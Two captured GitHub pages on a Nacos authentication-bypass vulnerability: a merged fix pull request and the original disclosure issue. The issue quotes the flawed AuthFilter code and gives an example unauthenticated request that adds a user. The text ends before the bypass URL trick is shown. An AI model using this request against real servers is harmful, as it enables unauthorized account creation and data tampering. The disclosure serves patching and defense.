=== Content from github.com_067c953e_20250115_083948.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fpull%2F4703)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fpull%2F4703)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=alibaba%2Fnacos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[alibaba](/alibaba)
/
**[nacos](/alibaba/nacos)**
Public

* [Notifications](/login?return_to=%2Falibaba%2Fnacos) You must be signed in to change notification settings
* [Fork
  12.9k](/login?return_to=%2Falibaba%2Fnacos)
* [Star
   30.7k](/login?return_to=%2Falibaba%2Fnacos)

* [Code](/alibaba/nacos)
* [Issues
  226](/alibaba/nacos/issues)
* [Pull requests
  10](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects
  0](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

Additional navigation options

* [Code](/alibaba/nacos)
* [Issues](/alibaba/nacos/issues)
* [Pull requests](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Falibaba%2Fnacos%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Falibaba%2Fnacos%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [ISSUE #4701] Fix bypass authentication(identity) problem. #4703

 Merged

[yanlinly](/yanlinly)
merged 1 commit into
[alibaba:develop](/alibaba/nacos/tree/develop "alibaba/nacos:develop")
from
[KomachiSion:develop-issue#4701](/KomachiSion/nacos/tree/develop-issue%234701 "KomachiSion/nacos:develop-issue#4701")

Jan 14, 2021

 Merged

# [[ISSUE #4701] Fix bypass authentication(identity) problem.](#top) #4703

[yanlinly](/yanlinly)
merged 1 commit into
[alibaba:develop](/alibaba/nacos/tree/develop "alibaba/nacos:develop")
from
[KomachiSion:develop-issue#4701](/KomachiSion/nacos/tree/develop-issue%234701 "KomachiSion/nacos:develop-issue#4701")

Jan 14, 2021

[Conversation
1](/alibaba/nacos/pull/4703)
[Commits
1](/alibaba/nacos/pull/4703/commits)
[Checks
0](/alibaba/nacos/pull/4703/checks)
[Files changed](/alibaba/nacos/pull/4703/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=60&v=4)](/KomachiSion)

Copy link

Collaborator

### @KomachiSion **[KomachiSion](/KomachiSion)** commented [Jan 14, 2021](#issue-785968398) • edited Loading

Please do not create a Pull Request without creating an issue first.

## What is the purpose of the change

Fix [#4701](https://github.com/alibaba/nacos/issues/4701)

* Add support for uri end with '/'
* Directly reject if can't find api path in nacos implementations.

## Brief changelog

XX

## Verifying this change

XXXX

Follow this checklist to help us incorporate your contribution quickly and easily:

* Make sure there is a Github issue filed for the change (usually before you start working on it). Trivial changes like typos do not require a Github issue. Your pull request should address just this issue, without pulling in other changes - one PR resolves one issue.
* Format the pull request title like `[ISSUE #123] Fix UnknownException when host config not exist`. Each commit in the pull request should have a meaningful subject line and body.
* Write a pull request description that is detailed enough to understand what the pull request does, how, and why.
* Write necessary unit-test to verify your logic correction, more mock a little better when cross module dependency exist. If the new feature or significant change is committed, please remember to add integration-test in [test module](https://github.com/alibaba/nacos/tree/master/test).
* Run `mvn -B clean package apache-rat:check findbugs:findbugs -Dmaven.test.skip=true` to make sure basic checks pass. Run `mvn clean install -DskipITs` to make sure unit-test pass. Run `mvn clean test-compile failsafe:integration-test` to make sure integration-test pass.

Sorry, something went wrong.

All reactions

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&v=4)](/KomachiSion)

`[Fix](/alibaba/nacos/pull/4703/commits/91d16023d91ea21a5e58722c751485a0b9bbeeb3 "Fix #4701") [alibaba#4701](https://github.com/alibaba/nacos/issues/4701)`

`[91d1602](/alibaba/nacos/pull/4703/commits/91d16023d91ea21a5e58722c751485a0b9bbeeb3)`

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)
[KomachiSion](/KomachiSion)
added this to the [1.4.1](/alibaba/nacos/milestone/23) milestone
[Jan 14, 2021](#event-4206111742)

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)
[KomachiSion](/KomachiSion)
added
the
[kind/bug](/alibaba/nacos/labels/kind/bug)
Category issues or prs related to bug.
label
[Jan 14, 2021](#event-4206112345)

[![yanlinly](https://avatars.githubusercontent.com/u/17695352?s=60&v=4)](/yanlinly)

**[yanlinly](/yanlinly)**
approved these changes
[Jan 14, 2021](#pullrequestreview-568210679)

 [View reviewed changes](/alibaba/nacos/pull/4703/files/91d16023d91ea21a5e58722c751485a0b9bbeeb3)

Copy link

Collaborator

### @yanlinly **[yanlinly](/yanlinly)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

ok

Sorry, something went wrong.

All reactions

[![@yanlinly](https://avatars.githubusercontent.com/u/17695352?s=40&u=d85738aab653d84a9a3cea26eafe9aa95ebe9d6f&v=4)](/yanlinly)
[yanlinly](/yanlinly)
merged commit [`2cc0be6`](/alibaba/nacos/commit/2cc0be6ae1cee1f2bcd2b19886380a15004eae47)
into
alibaba:develop

[Jan 14, 2021](https://github.com/alibaba/nacos/pull/4703#event-4206123664)

[KomachiSion](/KomachiSion)
added a commit
that referenced
this pull request
[Jan 14, 2021](#ref-commit-a18c27c)
[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)

`[Merge pull request](/alibaba/nacos/commit/a18c27c385465d08067d2715cc9a4d7b2c48b468 "Merge pull request #4704 from alibaba/develop

Fix #4701 (#4703)") [#4704](https://github.com/alibaba/nacos/pull/4704) [from alibaba/develop](/alibaba/nacos/commit/a18c27c385465d08067d2715cc9a4d7b2c48b468 "Merge pull request #4704 from alibaba/develop

Fix #4701 (#4703)")`
…

`[a18c27c](/alibaba/nacos/commit/a18c27c385465d08067d2715cc9a4d7b2c48b468)`

```
Fix [#4701](https://github.com/alibaba/nacos/issues/4701) ([#4703](https://github.com/alibaba/nacos/pull/4703))
```

[KomachiSion](/KomachiSion)
added a commit
that referenced
this pull request
[Jan 14, 2021](#ref-commit-d568030)
[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)

`[Fix](/alibaba/nacos/commit/d568030823f7559c0ce220898c25292e3f35a1d9 "Fix #4701 (#4703)

(cherry picked from commit 2cc0be6ae1cee1f2bcd2b19886380a15004eae47)") [#4701](https://github.com/alibaba/nacos/issues/4701) [(](/alibaba/nacos/commit/d568030823f7559c0ce220898c25292e3f35a1d9 "Fix #4701 (#4703)

(cherry picked from commit 2cc0be6ae1cee1f2bcd2b19886380a15004eae47)")[#4703](https://github.com/alibaba/nacos/pull/4703)[)](/alibaba/nacos/commit/d568030823f7559c0ce220898c25292e3f35a1d9 "Fix #4701 (#4703)

(cherry picked from commit 2cc0be6ae1cee1f2bcd2b19886380a15004eae47)")`
…

`[d568030](/alibaba/nacos/commit/d568030823f7559c0ce220898c25292e3f35a1d9)`

```
(cherry picked from commit [2cc0be6](https://github.com/alibaba/nacos/commit/2cc0be6ae1cee1f2bcd2b19886380a15004eae47))
```

 [![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&u=fb1941bda29c47909e47a27e3a1165f963116f83&v=4)](/KomachiSion)
[KomachiSion](/KomachiSion)
deleted the
develop-issue#4701

branch
[January 15, 2021 01:44](#event-4208960851)

[wjm0729](/wjm0729)
added a commit
to wjm0729/nacos
that referenced
this pull request
[Jan 21, 2021](#ref-commit-ff83d4e)
[![@wjm0729](https://avatars.githubusercontent.com/u/1888326?s=40&u=26fed0b13d6e82c8ed09a06b1686894632e3bf1d&v=4)](/wjm0729)

`[Merge branch 'develop' of](/wjm0729/nacos/commit/ff83d4e1e38570ca25cdc72d35a1508caadb6f03 "Merge branch 'develop' of https://github.com/alibaba/nacos into dev-1

* 'develop' of https://github.com/alibaba/nacos:
  Use SafeConstructor to parse yaml configuration for AbstractConfigChangeListener (#4753)
  [ISSUE #3922] method createServiceIfAbsent in ServiceManager require sync (#4713)
  fix cloning configuration last desc (#4697)
  [ISSUE #4661]configServletInner#doGetConfig code optimization (#4666)
  Use revision to set version and upgrade to 1.4.2-SNAPSHOT (#4711)
  Revert interceptor all ui problem
  Fix #4701 (#4703)
  delete comment.
  fix metadata batch operation may delete instance problem.
  Upgrade to 1.4.1 (#4695)
  fix #4686 (#4692)
  Build nacos console front for 1.4.1 (#4690)") <https://github.com/alibaba/nacos> [into dev-1](/wjm0729/nacos/commit/ff83d4e1e38570ca25cdc72d35a1508caadb6f03 "Merge branch 'develop' of https://github.com/alibaba/nacos into dev-1

* 'develop' of https://github.com/alibaba/nacos:
  Use SafeConstructor to parse yaml configuration for AbstractConfigChangeListener (#4753)
  [ISSUE #3922] method createServiceIfAbsent in ServiceManager require sync (#4713)
  fix cloning configuration last desc (#4697)
  [ISSUE #4661]configServletInner#doGetConfig code optimization (#4666)
  Use revision to set version and upgrade to 1.4.2-SNAPSHOT (#4711)
  Revert interceptor all ui problem
  Fix #4701 (#4703)
  delete comment.
  fix metadata batch operation may delete instance problem.
  Upgrade to 1.4.1 (#4695)
  fix #4686 (#4692)
  Build nacos console front for 1.4.1 (#4690)")`
…

`[ff83d4e](/wjm0729/nacos/commit/ff83d4e1e38570ca25cdc72d35a1508caadb6f03)`

```
* 'develop' of <https://github.com/alibaba/nacos>:
  Use SafeConstructor to parse yaml configuration for AbstractConfigChangeListener ([alibaba#4753](https://github.com/alibaba/nacos/pull/4753))
  [ISSUE [alibaba#3922](https://github.com/alibaba/nacos/issues/3922)] method createServiceIfAbsent in ServiceManager require sync ([alibaba#4713](https://github.com/alibaba/nacos/pull/4713))
  fix cloning configuration last desc ([alibaba#4697](https://github.com/alibaba/nacos/pull/4697))
  [ISSUE [alibaba#4661](https://github.com/alibaba/nacos/issues/4661)]configServletInner#doGetConfig code optimization ([alibaba#4666](https://github.com/alibaba/nacos/pull/4666))
  Use revision to set version and upgrade to 1.4.2-SNAPSHOT ([alibaba#4711](https://github.com/alibaba/nacos/pull/4711))
  Revert interceptor all ui problem
  Fix [alibaba#4701](https://github.com/alibaba/nacos/issues/4701) ([alibaba#4703](https://github.com/alibaba/nacos/pull/4703))
  delete comment.
  fix metadata batch operation may delete instance problem.
  Upgrade to 1.4.1 ([alibaba#4695](https://github.com/alibaba/nacos/pull/4695))
  fix [alibaba#4686](https://github.com/alibaba/nacos/issues/4686) ([alibaba#4692](https://github.com/alibaba/nacos/pull/4692))
  Build nacos console front for 1.4.1 ([alibaba#4690](https://github.com/alibaba/nacos/pull/4690))
```

[wjm0729](/wjm0729)
added a commit
to wjm0729/nacos
that referenced
this pull request
[Jan 21, 2021](#ref-commit-8483613)
[![@wjm0729](https://avatars.githubusercontent.com/u/1888326?s=40&u=26fed0b13d6e82c8ed09a06b1686894632e3bf1d&v=4)](/wjm0729)

`[Merge branch 'develop' of](/wjm0729/nacos/commit/84836130588109e67a89ba9355fa5e3d9b073e9b "Merge branch 'develop' of https://github.com/alibaba/nacos into develop-import-v1

* 'develop' of https://github.com/alibaba/nacos:
  Use SafeConstructor to parse yaml configuration for AbstractConfigChangeListener (#4753)
  [ISSUE #3922] method createServiceIfAbsent in ServiceManager require sync (#4713)
  fix cloning configuration last desc (#4697)
  [ISSUE #4661]configServletInner#doGetConfig code optimization (#4666)
  Use revision to set version and upgrade to 1.4.2-SNAPSHOT (#4711)
  Revert interceptor all ui problem
  Fix #4701 (#4703)
  delete comment.
  fix metadata batch operation may delete instance problem.
  Upgrade to 1.4.1 (#4695)
  fix #4686 (#4692)
  Build nacos console front for 1.4.1 (#4690)
  For checkstyle
  fix: fix Jraft WriteRequest type problem.
  Add server identity to replace user-agent white list. (#4683)") <https://github.com/alibaba/nacos> [into devel…](/wjm0729/nacos/commit/84836130588109e67a89ba9355fa5e3d9b073e9b "Merge branch 'develop' of https://github.com/alibaba/nacos into develop-import-v1

* 'develop' of https://github.com/alibaba/nacos:
  Use SafeConstructor to parse yaml configuration for AbstractConfigChangeListener (#4753)
  [ISSUE #3922] method createServiceIfAbsent in ServiceManager require sync (#4713)
  fix cloning configuration last desc (#4697)
  [ISSUE #4661]configServletInner#doGetConfig code optimization (#4666)
  Use revision to set version and upgrade to 1.4.2-SNAPSHOT (#4711)
  Revert interceptor all ui problem
  Fix #4701 (#4703)
  delete comment.
  fix metadata batch operation may delete instance problem.
  Upgrade to 1.4.1 (#4695)
  fix #4686 (#4692)
  Build nacos console front for 1.4.1 (#4690)
  For checkstyle
  fix: fix Jraft WriteRequest type problem.
  Add server identity to replace user-agent white list. (#4683)")`
…

`[8483613](/wjm0729/nacos/commit/84836130588109e67a89ba9355fa5e3d9b073e9b)`

```
…op-import-v1

* 'develop' of <https://github.com/alibaba/nacos>:
  Use SafeConstructor to parse yaml configuration for AbstractConfigChangeListener ([alibaba#4753](https://github.com/alibaba/nacos/pull/4753))
  [ISSUE [alibaba#3922](https://github.com/alibaba/nacos/issues/3922)] method createServiceIfAbsent in ServiceManager require sync ([alibaba#4713](https://github.com/alibaba/nacos/pull/4713))
  fix cloning configuration last desc ([alibaba#4697](https://github.com/alibaba/nacos/pull/4697))
  [ISSUE [alibaba#4661](https://github.com/alibaba/nacos/issues/4661)]configServletInner#doGetConfig code optimization ([alibaba#4666](https://github.com/alibaba/nacos/pull/4666))
  Use revision to set version and upgrade to 1.4.2-SNAPSHOT ([alibaba#4711](https://github.com/alibaba/nacos/pull/4711))
  Revert interceptor all ui problem
  Fix [alibaba#4701](https://github.com/alibaba/nacos/issues/4701) ([alibaba#4703](https://github.com/alibaba/nacos/pull/4703))
  delete comment.
  fix metadata batch operation may delete instance problem.
  Upgrade to 1.4.1 ([alibaba#4695](https://github.com/alibaba/nacos/pull/4695))
  fix [alibaba#4686](https://github.com/alibaba/nacos/issues/4686) ([alibaba#4692](https://github.com/alibaba/nacos/pull/4692))
  Build nacos console front for 1.4.1 ([alibaba#4690](https://github.com/alibaba/nacos/pull/4690))
  For checkstyle
  fix: fix Jraft WriteRequest type problem.
  Add server identity to replace user-agent white list. ([alibaba#4683](https://github.com/alibaba/nacos/pull/4683))
```

[![@threedr3am](https://avatars.githubusercontent.com/u/19884279?s=40&v=4)](/threedr3am)
[threedr3am](/threedr3am)
mentioned this pull request
[Oct 5, 2021](#ref-issue-1015516504)

[PRP: Request alibaba nacos(<=1.4.0) 'NACOS-ISSUE #4593' CVE-2021-29441 User-Agent authentication bypass vulnerability
google/tsunami-security-scanner-plugins#119](/google/tsunami-security-scanner-plugins/issues/119)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fpull%2F4703)

Reviewers

[![@yanlinly](https://avatars.githubusercontent.com/u/17695352?s=40&v=4)](/yanlinly) [yanlinly](/yanlinly)

yanlinly approved these changes

Assignees

No one assigned

Labels

[kind/bug](/alibaba/nacos/labels/kind/bug)
Category issues or prs related to bug.

Projects

None yet

Milestone

 [**1.4.1**](/alibaba/nacos/milestone/23 "1.4.1")

Development

Successfully merging this pull request may close these issues.

 [Report a security vulnerability in nacos to bypass authentication(identity) again](https://github.com/alibaba/nacos/issues/4701)

2 participants

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=52&v=4)](/KomachiSion) [![@yanlinly](https://avatars.githubusercontent.com/u/17695352?s=52&v=4)](/yanlinly)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1df6fa8e_20250115_083945.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fissues%2F4701)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fissues%2F4701)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=alibaba%2Fnacos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[alibaba](/alibaba)
/
**[nacos](/alibaba/nacos)**
Public

* [Notifications](/login?return_to=%2Falibaba%2Fnacos) You must be signed in to change notification settings
* [Fork
  12.9k](/login?return_to=%2Falibaba%2Fnacos)
* [Star
   30.7k](/login?return_to=%2Falibaba%2Fnacos)

* [Code](/alibaba/nacos)
* [Issues
  226](/alibaba/nacos/issues)
* [Pull requests
  10](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects
  0](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

Additional navigation options

* [Code](/alibaba/nacos)
* [Issues](/alibaba/nacos/issues)
* [Pull requests](/alibaba/nacos/pulls)
* [Actions](/alibaba/nacos/actions)
* [Projects](/alibaba/nacos/projects)
* [Wiki](/alibaba/nacos/wiki)
* [Security](/alibaba/nacos/security)
* [Insights](/alibaba/nacos/pulse)

# Report a security vulnerability in nacos to bypass authentication(identity) again #4701

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosed[#4703](https://github.com/alibaba/nacos/pull/4703)Closed[Report a security vulnerability in nacos to bypass authentication(identity) again](#top)#4701[#4703](https://github.com/alibaba/nacos/pull/4703)Copy linkLabels[kind/bugCategory issues or prs related to bug.](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22kind%2Fbug%22)Category issues or prs related to bug.Milestone[1.4.1](https://github.com/alibaba/nacos/milestone/23)![@threedr3am](https://avatars.githubusercontent.com/u/19884279?u=8d97a8268b879c86025c4ec4b4e38d0f63177c3b&v=4&size=80)
## Description

![@threedr3am](https://avatars.githubusercontent.com/u/19884279?u=8d97a8268b879c86025c4ec4b4e38d0f63177c3b&v=4&size=48)[threedr3am](https://github.com/threedr3am)opened [on Jan 14, 2021](https://github.com/alibaba/nacos/issues/4701#issue-785845058)

---------------------------------------------------------------------------- english

Hello, I’m threedr3am. I found that the latest version 1.4.1 of nacos still has a bypass problem for the serverIdentity key-value repair mechanism that bypasses security vulnerabilities in User-Agent. The custom key-value authentication of serverIdentity is enabled in nacos. Later, through the special url structure, it is still possible to bypass the restriction to access any http interface.

By viewing this function, you need to add the configuration `nacos.core.auth.enable.userAgentAuthWhite:false` in application.properties to avoid the ```User-Agent: Nacos-Server`'' bypassing authentication safe question.

But after turning on the mechanism, I found from the code that I can still bypass it under certain circumstances, make it invalid, and call any interface. Through this vulnerability, I can bypass the authentication and do:

Call the add user interface, add a new user (`POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test`), and then use the newly added user to log in to the console, Access, modify, and add data.

### 1. Vulnerability details

The problem mainly occurs in `com.alibaba.nacos.core.auth.AuthFilter#doFilter`:

```
public class AuthFilter implements Filter {

    @Autowired
    private AuthConfigs authConfigs;

    @Autowired
    private AuthManager authManager;

    @Autowired
    private ControllerMethodsCache methodsCache;

    private Map<Class<? extends ResourceParser>, ResourceParser> parserInstance = new ConcurrentHashMap<>();

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        if (!authConfigs.isAuthEnabled()) {
            chain.doFilter(request, response);
            return;
        }

        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;

        if (authConfigs.isEnableUserAgentAuthWhite()) {
            String userAgent = WebUtils.getUserAgent(req);
            if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) {
                chain.doFilter(request, response);
                return;
            }
        } else if (StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils
                .isNotBlank(authConfigs.getServerIdentityValue())) {
            String serverIdentity = req.getHeader(authConfigs.getServerIdentityKey());
            if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
                chain.doFilter(request, response);
                return;
            }
            Loggers.AUTH.warn("Invalid server identity value for {} from {}", authConfigs.getServerIdentityKey(),
                    req.getRemoteHost());
        } else {
            resp.sendError(HttpServletResponse.SC_FORBIDDEN,
                    "Invalid server identity key or value, Please make sure set `nacos.core.auth.server.identity.key`"
                            + " and `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`");
            return;
        }

        try {

            Method method = methodsCache.getMethod(req);

            if (method == null) {
                chain.doFilter(request, response);
                return;
            }

            ...鉴权代码

        }
        ...
    }
    ...
}

```

As you can see, the above three if else branches:

* The first one is `authConfigs.isEnableUserAgentAuthWhite()`, its default value is true, when the value is true, it will judge whether the request header User-Agent matches `User-Agent: Nacos-Server`` `, if it matches, skip all subsequent logic and execute` chain.doFilter(request, response);```
* The second one is `StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils.isNotBlank(authConfigs.getServerIdentityValue())`, which is nacos 1.4.1 version for` User-Agent: Nacos- Server``` Simple fix for security issues
* The third one is to respond directly to the request to deny access when the previous two conditions are not met

The problem appears in the second branch. You can see that when the developer of nacos adds the configuration `nacos.core.auth.enable.userAgentAuthWhite:false`'' in application.properties, the simple key-value authentication mechanism is turned on Then, it will get a value from the http header according to the` nacos.core.auth.server.identity.key`configured by the developer, and then go to the`nacos.core.auth.server. identity.value``` is matched, if it does not match, it will not enter the branch execution:

```
if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
    chain.doFilter(request, response);
    return;
}

```

But the problem is precisely here. The logic here should be to directly return denied access when there is a mismatch, but in fact we did not do this, which allows us to bypass the provision of conditions later.

